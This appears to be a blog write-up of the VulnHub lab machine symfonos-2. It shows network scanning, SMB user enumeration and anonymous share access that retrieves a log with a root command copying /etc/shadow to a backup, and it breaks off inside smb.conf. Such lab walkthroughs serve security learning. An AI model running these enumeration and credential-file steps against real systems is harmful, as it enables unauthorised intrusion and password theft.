<html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
        <title>/f0c1s/blog/sec/vulnhub/symfonos-2</title>
        <link rel="stylesheet" href="../../../index.css"/>
        <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
        <script src="../../../highlight/highlight.min.js"></script>
        <script src="../../../setup.js"></script>
        <script>hljs.highlightAll();</script>
    </head>
<body onload="setup()">
<h1>/f0c1s/blog/sec/vulnhub/symfonos-2</h1>

<nav>
    <a href="../../../index.html">/blog</a>
    <a href="../../index.html">Security</a>
    <a href="../index.html">VulnHub</a>
    <a href="../../../sec/vulnhub/symfonos-2/symfonos-2.html">+ symfonos-2 - 2022.01.05 Wednesday</a>
</nav>

## Description

> OSCP-like Intermediate real life based machine designed to teach the importance of understanding a vulnerability. SHOULD work for both VMware and Virtualbox.

[VulnHub: https://www.vulnhub.com/entry/symfonos-2,331/](https://www.vulnhub.com/entry/symfonos-2,331/)
[Series: https://www.vulnhub.com/series/symfonos,217/](https://www.vulnhub.com/series/symfonos,217/)

![0.running-box](0.running-box.png)

It does tell me the IP, but I won't believe it.

## Scanning


```shell
fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.89

```

```shell
export RHOST="192.168.56.89"
export LHOST="192.168.56.70"
export LPORT="443"

```

```shell
_n $RHOST
firing nmap 192.168.56.89 -n | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 18:23 IST
Nmap scan report for 192.168.56.89
Host is up (0.00038s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds

```

```shell
_ntd $RHOST
firing nmap 192.168.56.89 -p- -Pn -A -T4 --min-rate=5000 -sVC -n | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 18:23 IST
Nmap scan report for 192.168.56.89
Host is up (0.00010s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h29m58s, deviation: 3h27m50s, median: 5h29m58s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2022-01-05T18:23:53
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2022-01-05T12:23:53-06:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds

```

```shell
_nu $RHOST
firing sudo nmap 192.168.56.89 -sU -p- -Pn --min-rate=5000 --top-ports=500 -n | tee nmap.udp-all-ports.txt
[sudo] password for f0c1s:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 18:24 IST
Nmap scan report for 192.168.56.89
Host is up (0.0012s latency).
Not shown: 492 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
137/udp   open   netbios-ns
161/udp   open   snmp
631/udp   closed ipp
1701/udp  closed L2TP
27482/udp closed unknown
31059/udp closed unknown
41081/udp closed unknown
49158/udp closed unknown
MAC Address: 08:00:27:98:7A:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds

```

```shell
sudo nmap $RHOST -p- -Pn -A -T4 --min-rate=5000 -sVC --script=*enum* -n | tee nmap.enum.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 18:24 IST
Nmap scan report for 192.168.56.89
Host is up (0.00094s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh2-enum-algos:
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:98:7A:DC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-enum-domains:
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   SYMFONOS2
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
|_msrpc-enum: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-enum-sessions:
|_  <nobody>
| smb-mbenum:
|   DFS Root
|     SYMFONOS2  0.0  Samba 4.5.16-Debian
|   Master Browser
|     SYMFONOS2  0.0  Samba 4.5.16-Debian
|   Print server
|     SYMFONOS2  0.0  Samba 4.5.16-Debian
|   Server
|     SYMFONOS2  0.0  Samba 4.5.16-Debian
|   Server service
|     SYMFONOS2  0.0  Samba 4.5.16-Debian
|   Unix server
|     SYMFONOS2  0.0  Samba 4.5.16-Debian
|   Windows NT/2000/XP/2003 server
|     SYMFONOS2  0.0  Samba 4.5.16-Debian
|   Workstation
|_    SYMFONOS2  0.0  Samba 4.5.16-Debian
| smb-enum-shares:
|   account_used: guest
|   \\192.168.56.89\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.5.16-Debian)
|     Users: 4
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.89\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\aeolus\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.89\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

TRACEROUTE
HOP RTT     ADDRESS
1   0.94 ms 192.168.56.89

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 335.54 seconds

```

## Attacking web


```shell
curl http://$RHOST
<html>
<style>
html,body{
    margin:0;
    height:100%;}
img{
  display:block;
  width:100%; height:100%;
  object-fit: cover;}
</style>
<body>
<img src="image.jpg">
</body>
</html>

```

```shell
curl -I http://$RHOST
HTTP/1.1 200 OK
Server: webfs/1.21
Connection: Keep-Alive
Accept-Ranges: bytes
Content-Type: text/html
Content-Length: 183
Last-Modified: Thu, 18 Jul 2019 13:03:42 GMT
Date: Wed, 05 Jan 2022 18:31:10 GMT


```


```shell
curl -s -I http://$RHOST/robots.txt | tee curl.-sI-robots.txt
HTTP/1.1 404 Not Found
Server: webfs/1.21
Connection: Keep-Alive
Accept-Ranges: bytes
Content-Type: text/plain
Content-Length: 28
Date: Wed, 05 Jan 2022 18:31:25 GMT


```

```shell
nikto -C all -host http://$RHOST | tee nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.89
+ Target Hostname:    192.168.56.89
+ Target Port:        80
+ Start Time:         2022-01-05 18:31:57 (GMT5.5)
---------------------------------------------------------------------------
+ Server: webfs/1.21
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ 26523 requests: 1 error(s) and 3 item(s) reported on remote host
+ End Time:           2022-01-05 18:33:46 (GMT5.5) (109 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


```shell
feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
???? Caught ctrl+c ???? saving scan state to ferox-http_192_168_56_89-1641387982.state ...
Scanning: http://192.168.56.89

```


```shell
gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 404,403 -q

```

It seems there is nothing here...

## Attacking SMB

```shell
enum4linux -a $RHOST | tee enum4linux.txt
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan  5 18:38:55 2022

 ==========================
|    Target Information    |
 ==========================
Target ........... 192.168.56.89
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 192.168.56.89    |
 =====================================================
[+] Got domain/workgroup name: WORKGROUP

 =============================================
|    Nbtstat Information for 192.168.56.89    |
 =============================================
Looking up status of 192.168.56.89
        SYMFONOS2       <00> -         B <ACTIVE>  Workstation Service
        SYMFONOS2       <03> -         B <ACTIVE>  Messenger Service
        SYMFONOS2       <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================
|    Session Check on 192.168.56.89    |
 ======================================
[+] Server 192.168.56.89 allows sessions using username '', password ''

 ============================================
|    Getting domain SID for 192.168.56.89    |
 ============================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 192.168.56.89    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.89 from smbclient:
[+] Got OS info for 192.168.56.89 from srvinfo:
        SYMFONOS2      Wk Sv PrQ Unx NT SNT Samba 4.5.16-Debian
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ==============================
|    Users on 192.168.56.89    |
 ==============================
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ==========================================
|    Share Enumeration on 192.168.56.89    |
 ==========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.89
//192.168.56.89/print$  Mapping: DENIED, Listing: N/A
//192.168.56.89/anonymous       Mapping: OK, Listing: OK
//192.168.56.89/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =====================================================
|    Password Policy Information for 192.168.56.89    |
 =====================================================


[+] Attaching to 192.168.56.89 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SYMFONOS2
        [+] Builtin

[+] Password Info for Domain: SYMFONOS2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ===============================
|    Groups on 192.168.56.89    |
 ===============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 192.168.56.89 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-629329663-2933547119-2337616968
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\aeolus (Local User)
S-1-22-1-1001 Unix User\cronus (Local User)
[+] Enumerating users using SID S-1-5-21-629329663-2933547119-2337616968 and logon username '', password ''
S-1-5-21-629329663-2933547119-2337616968-500 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-501 SYMFONOS2\nobody (Local User)
S-1-5-21-629329663-2933547119-2337616968-502 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-503 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-504 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-505 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-506 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-507 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-508 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-509 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-510 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-511 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-512 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-513 SYMFONOS2\None (Domain Group)
S-1-5-21-629329663-2933547119-2337616968-514 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-515 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-516 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-517 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-518 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-519 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-520 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-521 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-522 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-523 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-524 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-525 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-526 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-527 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-528 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-529 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-530 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-531 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-532 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-533 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-534 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-535 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-536 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-537 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-538 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-539 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-540 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-541 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-542 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-543 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-544 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-545 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-546 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-547 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-548 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-549 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-550 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1000 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1001 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1002 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1003 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1004 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1005 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1006 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1007 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1008 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1009 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1010 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1011 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1012 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1013 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1014 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1015 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1016 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1017 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1018 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1019 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1020 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1021 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1022 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1023 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1024 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1025 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1026 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1027 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1028 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1029 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1030 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1031 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1032 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1033 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1034 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1035 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1036 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1037 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1038 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1039 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1040 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1041 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1042 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1043 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1044 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1045 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1046 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1047 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1048 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1049 *unknown*\*unknown* (8)
S-1-5-21-629329663-2933547119-2337616968-1050 *unknown*\*unknown* (8)

 ==============================================
|    Getting printer info for 192.168.56.89    |
 ==============================================
No printers returned.


enum4linux complete on Wed Jan  5 18:39:07 2022


```

Two users `aeolus` and `cronus`.

```shell
smbclient //$RHOST/anonymous -U ''
Enter WORKGROUP\'s password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 20:00:09 2019
  ..                                  D        0  Thu Jul 18 19:59:08 2019
  backups                             D        0  Thu Jul 18 19:55:17 2019

                19728000 blocks of size 1024. 16314032 blocks available
smb: \> cd backups
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 19:55:17 2019
  ..                                  D        0  Thu Jul 18 20:00:09 2019
  log.txt                             N    11394  Thu Jul 18 19:55:16 2019

                19728000 blocks of size 1024. 16314032 blocks available
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt (1390.9 KiloBytes/sec) (average 1390.9 KiloBytes/sec)
smb: \backups\> exit

```

```shell
cat log.txt
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which
# are not shown in this example
#
